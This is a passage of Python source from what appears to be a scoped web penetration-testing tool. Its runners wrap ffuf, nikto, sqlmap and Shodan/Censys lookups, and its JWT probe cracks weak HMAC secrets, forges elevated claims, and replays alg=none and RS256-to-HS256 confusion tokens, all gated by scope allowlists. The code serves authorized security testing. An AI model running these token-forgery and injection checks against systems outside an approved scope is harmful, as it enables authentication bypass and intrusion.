    check_results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    _extract_jwt_sources_from_evidence(evidence_records, token_records, raw_tokens)
    for token in jwt_tokens or []:
        _record_jwt_token(
            token_records,
            raw_tokens,
            token=str(token),
            source_url="provided-token",
            source_type="provided-token",
        )

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for target in normalized_targets:
            try:
                response = client.get(target)
                body = response.text or ""
                for token in _jwt_tokens_from_text(body):
                    _record_jwt_token(
                        token_records,
                        raw_tokens,
                        token=token,
                        source_url=target,
                        source_type="response",
                    )
                for script_src in SCRIPT_SRC_PATTERN.findall(body):
                    script_url = urljoin(target, script_src)
                    if not _target_within_scope(scope_allowlist, script_url):
                        continue
                    try:
                        script_response = client.get(script_url)
                        for token in _jwt_tokens_from_text(script_response.text or ""):
                            _record_jwt_token(
                                token_records,
                                raw_tokens,
                                token=token,
                                source_url=script_url,
                                source_type="javascript",
                            )
                    except httpx_client.HTTPError as exc:
                        stderr_lines.append(f"{script_url}: {exc}")
            except httpx_client.HTTPError as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")

        for jwks_url in _configured_jwks_endpoints(
            normalized_targets,
            scope_allowlist=scope_allowlist,
            jwks_endpoints=jwks_endpoints,
        ):
            try:
                response = client.get(jwks_url)
                jwks_payload = response.json() if response.status_code < 500 else {}
                keys = jwks_payload.get("keys") if isinstance(jwks_payload, dict) else []
                key_count = len(keys) if isinstance(keys, list) else 0
                private_exposed = any(
                    isinstance(jwk, dict) and _jwks_private_key_exposed(jwk)
                    for jwk in keys
                    if isinstance(keys, list)
                )
                jwks_results.append(
                    {
                        "url": jwks_url,
                        "status_code": response.status_code,
                        "key_count": key_count,
                        "private_key_exposed": private_exposed,
                    }
                )
                if private_exposed:
                    findings.append(
                        _finding(
                            title="JWT Private Key Exposed in JWKS",
                            severity="critical",
                            target=jwks_url,
                            summary=(
                                "The approved JWKS endpoint exposes private key material, "
                                "allowing JWT signing key compromise."
                            ),
                            tags=["jwt", "jwks", "authentication", "owasp-wstg"],
                            extra={"jwks_url": jwks_url, "private_key_material_stored": False},
                        )
                    )
            except (httpx_client.HTTPError, ValueError) as exc:
                stderr_lines.append(f"{jwks_url}: {exc}")

        for token_record in token_records:
            fingerprint = str(token_record["fingerprint"])
            token = raw_tokens[fingerprint]
            parsed = _parse_jwt(token)
            if parsed is None:
                continue
            alg = str(parsed["alg"]).upper()
            source_url = str(token_record.get("source_url") or normalized_targets[0])

            if alg in JWT_HMAC_ALGORITHMS:
                cracked_secret = None
                for candidate_secret in secret_candidates:
                    if _verify_hmac_jwt(parsed, candidate_secret):
                        cracked_secret = candidate_secret
                        break
                check_results.append(
                    {
                        "token_fingerprint": fingerprint,
                        "check": "weak-hmac-secret",
                        "alg": alg,
                        "candidate_count": len(secret_candidates),
                        "cracked": cracked_secret is not None,
                    }
                )
                if cracked_secret is not None:
                    findings.append(
                        _finding(
                            title="JWT Weak Secret Cracked",
                            severity="high",
                            target=source_url,
                            summary=(
                                "A captured HMAC-signed JWT validated with a bounded weak-secret "
                                "candidate, indicating the signing secret is guessable."
                            ),
                            tags=["jwt", "authentication", "session_management", "owasp-wstg"],
                            extra={
                                "token_fingerprint": fingerprint,
                                "alg": alg,
                                "weak_secret_masked": _mask_secret(cracked_secret),
                                "weak_secret_sha256": hashlib.sha256(
                                    cracked_secret.encode("utf-8")
                                ).hexdigest(),
                                "candidate_count": len(secret_candidates),
                                "raw_token_stored": False,
                            },
                        )
                    )
                    mutated_claims = _claim_mutation(parsed["payload"])
                    if mutated_claims is not None and configured_replay_contexts:
                        claims_token = _sign_jwt(
                            header=parsed["header"],
                            payload=mutated_claims,
                            secret=cracked_secret,
                            alg=alg,
                        )
                        for context in configured_replay_contexts:
                            replay = _replay_jwt(
                                client,
                                context=context,
                                token=claims_token,
                                scope_allowlist=scope_allowlist,
                            )
                            replay.update(
                                {
                                    "token_fingerprint": fingerprint,
                                    "check": "claims-manipulation",
                                }
                            )
                            check_results.append(replay)
                            if replay.get("accepted") is True:
                                findings.append(
                                    _finding(
                                        title="JWT Claims Manipulation Possible",
                                        severity="high",
                                        target=str(replay.get("endpoint") or source_url),
                                        summary=(
                                            "A replay of a JWT with elevated authorization claims was "
                                            "accepted in an explicitly approved replay context."
                                        ),
                                        tags=["jwt", "authorization", "authentication", "owasp-wstg"],
                                        extra={
                                            "token_fingerprint": fingerprint,
                                            "replay_endpoint": replay.get("endpoint"),
                                            "mutated_claim_keys": sorted(mutated_claims.keys()),
                                            "modified_token_stored": False,
                                        },
                                    )
                                )
                                break

            if configured_replay_contexts:
                none_token = _none_jwt(header=parsed["header"], payload=parsed["payload"])
                for context in configured_replay_contexts:
                    replay = _replay_jwt(
                        client,
                        context=context,
                        token=none_token,
                        scope_allowlist=scope_allowlist,
                    )
                    replay.update({"token_fingerprint": fingerprint, "check": "none-algorithm"})
                    check_results.append(replay)
                    if replay.get("accepted") is True:
                        findings.append(
                            _finding(
                                title="JWT None Algorithm Accepted",
                                severity="critical",
                                target=str(replay.get("endpoint") or source_url),
                                summary=(
                                    "A JWT modified to use alg=none and an empty signature was "
                                    "accepted in an explicitly approved replay context."
                                ),
                                tags=["jwt", "authentication", "session_management", "owasp-wstg"],
                                extra={
                                    "token_fingerprint": fingerprint,
                                    "original_alg": alg,
                                    "replay_endpoint": replay.get("endpoint"),
                                    "modified_token_stored": False,
                                },
                            )
                        )
                        break
            else:
                check_results.append(
                    {
                        "token_fingerprint": fingerprint,
                        "check": "none-algorithm",
                        "status": "not_replayed",
                        "reason": "no explicitly approved replay context",
                    }
                )

            if alg.startswith(("RS", "PS", "ES")):
                if not explicit_public_keys:
                    check_results.append(
                        {
                            "token_fingerprint": fingerprint,
                            "check": "algorithm-confusion",
                            "status": "not_replayed",
                            "reason": "no explicit public key material",
                        }
                    )
                    continue
                for public_key in explicit_public_keys:
                    confusion_token = _sign_jwt(
                        header=parsed["header"],
                        payload=parsed["payload"],
                        secret=public_key,
                        alg="HS256",
                    )
                    for context in configured_replay_contexts:
                        replay = _replay_jwt(
                            client,
                            context=context,
                            token=confusion_token,
                            scope_allowlist=scope_allowlist,
                        )
                        replay.update(
                            {
                                "token_fingerprint": fingerprint,
                                "check": "algorithm-confusion",
                                "original_alg": alg,
                                "mutated_alg": "HS256",
                            }
                        )
                        check_results.append(replay)
                        if replay.get("accepted") is True:
                            findings.append(
                                _finding(
                                    title="JWT Algorithm Confusion (RS256 to HS256)",
                                    severity="critical",
                                    target=str(replay.get("endpoint") or source_url),
                                    summary=(
                                        "A JWT modified from an asymmetric algorithm to HS256 and "
                                        "signed with explicitly available public key material was "
                                        "accepted in an approved replay context."
                                    ),
                                    tags=["jwt", "authentication", "session_management", "owasp-wstg"],
                                    extra={
                                        "token_fingerprint": fingerprint,
                                        "original_alg": alg,
                                        "mutated_alg": "HS256",
                                        "replay_endpoint": replay.get("endpoint"),
                                        "public_key_material_stored": False,
                                        "modified_token_stored": False,
                                    },
                                )
                            )
                            break

    artifact_payload = {
        "tokens": token_records,
        "jwks": jwks_results,
        "checks": check_results,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "token_count": len(token_records),
            "jwks_endpoint_count": len(jwks_results),
            "finding_count": len(findings),
            "weak_secret_candidate_count": len(secret_candidates),
            "replay_context_count": len(configured_replay_contexts),
        },
        "safety": {
            "raw_tokens_stored": False,
            "modified_tokens_stored": False,
            "weak_secret_bound": len(secret_candidates),
            "replay_requires_explicit_context": True,
            "unrelated_user_token_generation": False,
        },
    }
    return RunnerExecution(
        tool="jwt-probe",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.jwt:v1",
            "tool_version": "custom-python",
            "finding_count": len(findings),
            "token_count": len(token_records),
            "replay_context_count": len(configured_replay_contexts),
        },
        artifacts=[_json_artifact(JWT_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def execute_vuln_components_scan(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    local_cve_records: list[dict[str, Any]] | None = None,
    dependency_paths: list[str] | None = None,
    timeout_seconds: float = 30.0,
    client_factory: Callable[..., Any] = httpx_client.Client,
) -> RunnerExecution:
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    compact_records = [
        _compact_cve_record(record)
        for record in local_cve_records or []
        if isinstance(record, dict)
    ]

    components: list[dict[str, Any]] = []
    fetched_resources: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0
    headers = {"User-Agent": "AegisPT/vuln-components read-only fingerprinting"}

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for target in normalized_targets:
            try:
                response = client.get(target, headers=headers)
                text = response.text or ""
                header_text = "\n".join(
                    f"{name}: {value}"
                    for name, value in response.headers.items()
                    if name.lower() in {"server", "x-powered-by", "x-aspnet-version", "x-generator"}
                )
                fetched_resources.append(
                    {
                        "url": target,
                        "status_code": response.status_code,
                        "content_type": response.headers.get("content-type", ""),
                        "source_type": "target-response",
                    }
                )
                components.extend(_detect_versions(header_text, source="headers", source_url=target))
                for comment in HTML_COMMENT_PATTERN.finditer(text):
                    components.extend(
                        _detect_versions(comment.group("body"), source="html-comment", source_url=target)
                    )
                components.extend(_detect_versions(text[:200000], source="html-body", source_url=target))

                for script_url in _script_urls_from_html(text, base_url=target, scope_allowlist=scope_allowlist)[:24]:
                    try:
                        script_response = client.get(script_url, headers=headers)
                        script_text = script_response.text or ""
                        fetched_resources.append(
                            {
                                "url": script_url,
                                "status_code": script_response.status_code,
                                "content_type": script_response.headers.get("content-type", ""),
                                "source_type": "linked-script",
                            }
                        )
                        components.extend(
                            _detect_versions(script_url, source="script-url", source_url=script_url)
                        )
                        components.extend(
                            _detect_versions(script_text[:200000], source="script-content", source_url=script_url)
                        )
                    except httpx_client.HTTPError as exc:
                        stderr_lines.append(f"{script_url}: {exc}")

                for dependency_url in _dependency_file_urls(
                    target,
                    scope_allowlist=scope_allowlist,
                    paths=dependency_paths,
                ):
                    try:
                        dependency_response = client.get(dependency_url, headers=headers)
                        body = dependency_response.text or ""
                        fetched_resources.append(
                            {
                                "url": dependency_url,
                                "status_code": dependency_response.status_code,
                                "content_type": dependency_response.headers.get("content-type", ""),
                                "source_type": "exposed-dependency-file",
                            }
                        )
                        if 200 <= dependency_response.status_code < 300 and body.strip():
                            components.extend(
                                _dependencies_from_exposed_file(body[:500000], source_url=dependency_url)
                            )
                    except httpx_client.HTTPError as exc:
                        stderr_lines.append(f"{dependency_url}: {exc}")
            except httpx_client.HTTPError as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")

    deduped_components: list[dict[str, Any]] = []
    seen_component_keys: set[tuple[str, str, str]] = set()
    for component in components:
        key = _component_key(component)
        if key in seen_component_keys:
            continue
        seen_component_keys.add(key)
        cve_matches = _match_local_cves(component, compact_records)
        enriched = {**component, "cve_matches": cve_matches}
        deduped_components.append(enriched)
        if not cve_matches:
            continue
        cve_ids = [str(match["cve_id"]) for match in cve_matches]
        first = cve_matches[0]
        findings.append(
            _finding(
                title=f"Outdated Library: {component['product']} {component['version']}",
                severity=_severity_from_cves(cve_matches),
                target=str(component.get("source_url") or ""),
                summary=(
                    f"{component['product']} {component['version']} was fingerprinted from "
                    f"{component.get('source')} evidence and matched local CVE cache record(s): "
                    f"{', '.join(cve_ids)}. {first.get('summary') or first.get('title') or ''}".strip()
                ),
                tags=[
                    "vuln-components",
                    "vulnerable-components",
                    "cve",
                    "owasp-wstg",
                    "configuration",
                ],
                extra={
                    "product": component["product"],
                    "version": component["version"],
                    "source": component.get("source"),
                    "source_url": component.get("source_url"),
                    "cve_ids": cve_ids,
                    "local_cache_only": True,
                    "external_lookup_performed": False,
                    "references": [
                        reference
                        for match in cve_matches
                        for reference in match.get("references", [])
                    ],
                },
            )
        )

    artifact_payload = {
        "components": deduped_components,
        "resources": fetched_resources,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "resource_count": len(fetched_resources),
            "component_count": len(deduped_components),
            "local_cve_record_count": len(compact_records),
            "matched_component_count": sum(1 for item in deduped_components if item.get("cve_matches")),
            "finding_count": len(findings),
        },
        "methodology": {
            "runner": "vuln-components",
            "version_fingerprinting_sources": [
                "response-headers",
                "html-comments",
                "html-body",
                "linked-script-url",
                "linked-script-content",
                "explicitly-exposed-dependency-files",
            ],
            "cve_matching": "local-cache-only",
            "external_lookup_performed": False,
        },
        "safety": {
            "read_only": True,
            "exploitation": False,
            "dependency_file_probe": True,
            "dependency_file_probe_scope": "approved-web-root-only",
            "source_code_review": False,
        },
    }
    return RunnerExecution(
        tool="vuln-components",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.vuln_components:v1",
            "tool_version": "custom-python-local-cve",
            "finding_count": len(findings),
            "component_count": len(deduped_components),
            "local_cve_record_count": len(compact_records),
        },
        artifacts=[_json_artifact(VULN_COMPONENTS_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def execute_content_discovery(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    binary: str = "ffuf",
    wordlist_path: str | None = None,
    rate_limit: int = 2,
    timeout_seconds: float = 60.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    if rate_limit <= 0:
        raise ValueError("rate_limit must be greater than zero")
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-content-discovery-") as tmp:
        tmp_path = Path(tmp)
        selected_wordlist = _content_wordlist_path(wordlist_path, tmp_path)
        for index, target in enumerate(normalized_targets):
            output_path = tmp_path / f"ffuf-{index}.json"
            command = [
                binary,
                "-u",
                f"{target.rstrip('/')}/FUZZ",
                "-w",
                str(selected_wordlist),
                "-of",
                "json",
                "-o",
                str(output_path),
                "-rate",
                str(rate_limit),
                "-t",
                str(max(1, min(rate_limit, 8))),
                "-timeout",
                str(max(1, int(timeout_seconds))),
                "-noninteractive",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")
                results.append({"target": target, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())

            payload: dict[str, Any] = {}
            if output_path.exists():
                try:
                    payload = json.loads(output_path.read_text(encoding="utf-8"))
                except (json.JSONDecodeError, OSError) as exc:
                    stderr_lines.append(f"{target}: unable to parse ffuf output: {exc}")

            raw_hits = payload.get("results", []) if isinstance(payload, dict) else []
            target_hits: list[dict[str, Any]] = []
            for raw_hit in raw_hits if isinstance(raw_hits, list) else []:
                if not isinstance(raw_hit, dict):
                    continue
                url = str(raw_hit.get("url") or "").strip()
                if not url or not _target_within_scope(scope_allowlist, url):
                    continue
                status_code = int(raw_hit.get("status") or raw_hit.get("status_code") or 0)
                if status_code not in {200, 201, 202, 203, 204, 301, 302, 307, 308, 401, 403}:
                    continue
                hit = {
                    "url": url,
                    "status_code": status_code,
                    "length": raw_hit.get("length"),
                    "words": raw_hit.get("words"),
                    "lines": raw_hit.get("lines"),
                }
                target_hits.append(hit)
                findings.append(
                    _finding(
                        title="Hidden Endpoint Discovered",
                        severity=_content_discovery_severity(status_code, url),
                        target=url,
                        summary=(
                            f"Content discovery found {url} returning HTTP {status_code} "
                            "inside the approved web root."
                        ),
                        tags=["content-discovery", "owasp-wstg", "configuration"],
                        extra=hit,
                    )
                )
            results.append(
                {
                    "target": target,
                    "status": "ok" if process.returncode in {0, 1} else "error",
                    "command": command[:],
                    "hit_count": len(target_hits),
                    "hits": target_hits,
                }
            )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "finding_count": len(findings),
            "rate_limit": rate_limit,
        },
    }
    return RunnerExecution(
        tool="content-discovery",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.content_discovery:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
        artifacts=[_json_artifact(CONTENT_DISCOVERY_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _nikto_severity(message: str) -> str:
    lowered = message.lower()
    if any(token in lowered for token in ("cve-", "vulnerable", "shell", "rce", "remote code")):
        return "high"
    if any(token in lowered for token in ("outdated", "dangerous", "backup", "admin", "default")):
        return "medium"
    if any(token in lowered for token in ("header", "cookie", "x-frame", "x-content-type")):
        return "low"
    return "info"


def _nikto_items(payload: Any) -> list[dict[str, Any]]:
    if isinstance(payload, dict):
        for key in ("vulnerabilities", "items"):
            if isinstance(payload.get(key), list):
                return [item for item in payload[key] if isinstance(item, dict)]
        if isinstance(payload.get("hosts"), list):
            items: list[dict[str, Any]] = []
            for host in payload["hosts"]:
                if isinstance(host, dict):
                    host_items = host.get("vulnerabilities") or host.get("items") or []
                    if isinstance(host_items, list):
                        items.extend(item for item in host_items if isinstance(item, dict))
            return items
    if isinstance(payload, list):
        return [item for item in payload if isinstance(item, dict)]
    return []


def execute_nikto_scan(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    binary: str = "nikto",
    timeout_seconds: float = 120.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-nikto-") as tmp:
        tmp_path = Path(tmp)
        for index, target in enumerate(normalized_targets):
            output_path = tmp_path / f"nikto-{index}.json"
            command = [
                binary,
                "-host",
                target,
                "-Format",
                "json",
                "-output",
                str(output_path),
                "-nointeractive",
                "-ask",
                "no",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{target}: {exc}")
                results.append({"target": target, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())

            payload: Any = {}
            if output_path.exists():
                try:
                    payload = json.loads(output_path.read_text(encoding="utf-8"))
                except (json.JSONDecodeError, OSError) as exc:
                    stderr_lines.append(f"{target}: unable to parse nikto output: {exc}")

            items = _nikto_items(payload)
            target_findings: list[dict[str, Any]] = []
            for item in items:
                message = str(
                    item.get("msg")
                    or item.get("message")
                    or item.get("description")
                    or item.get("text")
                    or ""
                ).strip()
                if not message:
                    continue
                target_url = str(item.get("url") or item.get("target") or target).strip() or target
                if not _target_within_scope(scope_allowlist, target_url):
                    continue
                finding = _finding(
                    title="Web Server Configuration Finding",
                    severity=_nikto_severity(message),
                    target=target_url,
                    summary=message,
                    tags=["nikto", "owasp-wstg", "configuration"],
                    extra={
                        "nikto_id": item.get("id") or item.get("osvdb") or item.get("reference"),
                        "method": item.get("method"),
                    },
                )
                findings.append(finding)
                target_findings.append(finding)

            results.append(
                {
                    "target": target,
                    "status": "ok" if process.returncode in {0, 1} else "error",
                    "finding_count": len(target_findings),
                    "findings": target_findings,
                }
            )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {"target_count": len(normalized_targets), "finding_count": len(findings)},
    }
    return RunnerExecution(
        tool="nikto",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.nikto:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
        artifacts=[_json_artifact(NIKTO_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _candidate_parameters(*values: Any) -> list[dict[str, str]]:
    candidates: list[dict[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for value in values:
        if not isinstance(value, list):
            continue
        for item in value:
            if not isinstance(item, dict):
                continue
            url = str(item.get("url") or item.get("target") or "").strip()
            parameter = str(item.get("parameter") or item.get("param") or "").strip()
            if not url or not parameter:
                continue
            source = str(item.get("source") or "explicit").strip() or "explicit"
            key = (url, parameter)
            if key in seen:
                continue
            seen.add(key)
            candidates.append({"url": normalize_http_target(url), "parameter": parameter, "source": source})
    return candidates


def execute_sqlmap_confirmation(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    injectable_parameters: list[dict[str, Any]] | None = None,
    zap_flagged_parameters: list[dict[str, Any]] | None = None,
    binary: str = "sqlmap",
    timeout_seconds: float = 180.0,
    command_runner: CommandRunner | None = None,
) -> RunnerExecution:
    candidates = _candidate_parameters(injectable_parameters, zap_flagged_parameters)
    if not candidates:
        raise ValueError(
            "sqlmap requires an explicit parameter target or ZAP-flagged injectable parameter"
        )
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    approved_target_set = set(_approved_web_targets(targets, scope_allowlist=scope_allowlist))
    for candidate in candidates:
        if not _target_within_scope(scope_allowlist, candidate["url"]):
            raise ValueError(f"target outside scope: {candidate['url']}")
        if approved_target_set and not any(candidate["url"].startswith(target.rstrip("/") + "/") or candidate["url"] == target for target in approved_target_set):
            raise ValueError(f"sqlmap parameter target is outside the queued approved web root: {candidate['url']}")

    runner = command_runner or _run_command
    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    with tempfile.TemporaryDirectory(prefix="aegispt-sqlmap-") as tmp:
        output_dir = Path(tmp) / "sqlmap-output"
        output_dir.mkdir(parents=True, exist_ok=True)
        for candidate in candidates:
            command = [
                binary,
                "-u",
                candidate["url"],
                "-p",
                candidate["parameter"],
                "--batch",
                "--smart",
                "--level",
                "1",
                "--risk",
                "1",
                "--output-dir",
                str(output_dir),
                "--flush-session",
            ]
            try:
                process = runner(
                    command,
                    capture_output=True,
                    text=True,
                    check=False,
                    timeout=max(timeout_seconds, 5.0),
                )
            except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
                exit_code = 1
                stderr_lines.append(f"{candidate['url']}:{candidate['parameter']}: {exc}")
                results.append({**candidate, "status": "error", "error": str(exc)})
                continue

            if process.returncode not in {0, 1}:
                exit_code = max(exit_code, process.returncode)
            if process.stderr:
                stderr_lines.append(process.stderr.strip())
            stdout = process.stdout or ""
            vulnerable = bool(
                re.search(r"\bis vulnerable\b", stdout, re.IGNORECASE)
                or re.search(r"\bparameter\b.*\bappears to be\b.*\binjectable\b", stdout, re.IGNORECASE)
            )
            result = {
                **candidate,
                "status": "ok" if process.returncode in {0, 1} else "error",
                "vulnerable": vulnerable,
                "stdout_excerpt": stdout[-2000:],
            }
            results.append(result)
            if vulnerable:
                findings.append(
                    _finding(
                        title="Confirmed SQL Injection",
                        severity="high",
                        target=candidate["url"],
                        summary=(
                            f"sqlmap confirmed SQL injection behavior for parameter "
                            f"{candidate['parameter']} on an explicitly scoped URL."
                        ),
                        tags=["sqlmap", "owasp-wstg", "input_validation"],
                        extra={"parameter": candidate["parameter"], "source": candidate["source"]},
                    )
                )

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {"parameter_count": len(candidates), "finding_count": len(findings)},
    }
    return RunnerExecution(
        tool="sqlmap",
        exit_code=exit_code,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if exit_code == 0 else "completed_with_errors",
            "runner_digest": "workers.web_depth.sqlmap:v1",
            "tool_version": binary,
            "finding_count": len(findings),
            "parameter_count": len(candidates),
        },
        artifacts=[_json_artifact(SQLMAP_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )


def _host_or_domain(target: str) -> str:
    parsed = urlparse(str(target).strip() if "://" in str(target) else f"//{target}")
    return str(parsed.hostname or parsed.path or target).strip().rstrip("/").lower()


def _shodan_findings(target: str, payload: Any) -> list[dict[str, Any]]:
    if not isinstance(payload, dict):
        return []
    findings: list[dict[str, Any]] = []
    vulns = payload.get("vulns") if isinstance(payload.get("vulns"), dict) else {}
    for cve in sorted(vulns.keys()) if isinstance(vulns, dict) else []:
        findings.append(
            _finding(
                title="Public Vulnerability Exposure",
                severity="high",
                target=target,
                summary=f"Shodan reports {cve} for this approved target.",
                tags=["external-osint", "shodan", "configuration"],
                extra={"cve": cve, "source": "shodan"},
            )
        )
    services = payload.get("data") if isinstance(payload.get("data"), list) else []
    for service in services:
        if not isinstance(service, dict):
            continue
        port = service.get("port")
        product = str(service.get("product") or service.get("server") or "").strip()
        findings.append(
            _finding(
                title="Public Service Exposure",
                severity="info",
                target=target,
                summary=(
                    f"Shodan reports public service exposure on port {port}"
                    + (f" ({product})." if product else ".")
                ),
                tags=["external-osint", "shodan", "information_gathering"],
                extra={"port": port, "product": product or None, "source": "shodan"},
            )
        )
    return findings


def _censys_findings(target: str, payload: Any) -> list[dict[str, Any]]:
    if not isinstance(payload, dict):
        return []
    results = payload.get("result", {}).get("hits") if isinstance(payload.get("result"), dict) else payload.get("hits")
    if not isinstance(results, list):
        return []
    findings: list[dict[str, Any]] = []
    for hit in results:
        if not isinstance(hit, dict):
            continue
        services = hit.get("services") if isinstance(hit.get("services"), list) else []
        for service in services:
            if not isinstance(service, dict):
                continue
            port = service.get("port")
            service_name = str(service.get("service_name") or service.get("transport_protocol") or "").strip()
            findings.append(
                _finding(
                    title="Public Service Exposure",
                    severity="info",
                    target=target,
                    summary=(
                        f"Censys reports public service exposure on port {port}"
                        + (f" ({service_name})." if service_name else ".")
                    ),
                    tags=["external-osint", "censys", "information_gathering"],
                    extra={"port": port, "service": service_name or None, "source": "censys"},
                )
            )
    return findings


def execute_external_osint_recon(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    shodan_api_key: str | None = None,
    censys_api_id: str | None = None,
    censys_api_secret: str | None = None,
    timeout_seconds: float = 20.0,
    client_factory=httpx_client.Client,
) -> RunnerExecution:
    normalized_targets = [_host_or_domain(target) for target in targets if str(target or "").strip()]
    normalized_targets = list(dict.fromkeys(target for target in normalized_targets if target))
    if not normalized_targets:
        raise ValueError("at least one target is required")
    if not shodan_api_key and not (censys_api_id and censys_api_secret):
        raise ValueError("external OSINT recon requires SHODAN_API_KEY or Censys API credentials")

    scope = scope_allowlist or {}
    for target in normalized_targets:
        if scope and not target_value_is_allowed(scope, target):
            raise ValueError(f"target outside scope: {target}")

    results: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
        for target in normalized_targets:
            target_result: dict[str, Any] = {"target": target, "sources": {}}
            if shodan_api_key:
                try:
                    shodan_response = client.get(
                        f"https://api.shodan.io/shodan/host/{target}",
                        params={"key": shodan_api_key},
                        headers={"Accept": "application/json"},
                    )
                    if shodan_response.status_code == 404:
                        shodan_payload: Any = {"data": []}
                    else:
                        shodan_response.raise_for_status()
                        shodan_payload = shodan_response.json()
                    target_result["sources"]["shodan"] = shodan_payload
                    findings.extend(_shodan_findings(target, shodan_payload))
                except (httpx_client.HTTPError, ValueError, json.JSONDecodeError) as exc:
                    stderr_lines.append(f"{target}: shodan lookup failed: {exc}")
                    target_result["sources"]["shodan_error"] = str(exc)

            if censys_api_id and censys_api_secret:
                try:
                    censys_response = client.get(
                        "https://search.censys.io/api/v2/hosts/search",
                        params={"q": target, "per_page": 10},
                        auth=(censys_api_id, censys_api_secret),
                        headers={"Accept": "application/json"},
                    )
                    censys_response.raise_for_status()
                    censys_payload = censys_response.json()
                    target_result["sources"]["censys"] = censys_payload
                    findings.extend(_censys_findings(target, censys_payload))
                except (httpx_client.HTTPError, ValueError, json.JSONDecodeError) as exc:
                    stderr_lines.append(f"{target}: censys lookup failed: {exc}")
                    target_result["sources"]["censys_error"] = str(exc)

            results.append(target_result)

    artifact_payload = {
        "results": results,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "finding_count": len(findings),
            "shodan_configured": bool(shodan_api_key),
            "censys_configured": bool(censys_api_id and censys_api_secret),
        },
    }
    return RunnerExecution(
        tool="external-osint",
        exit_code=0,
        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": "ok" if not stderr_lines else "completed_with_errors",
            "runner_digest": "workers.web_depth.external_osint:v1",
            "tool_version": "shodan-censys-api",
            "finding_count": len(findings),
            "target_count": len(normalized_targets),
        },
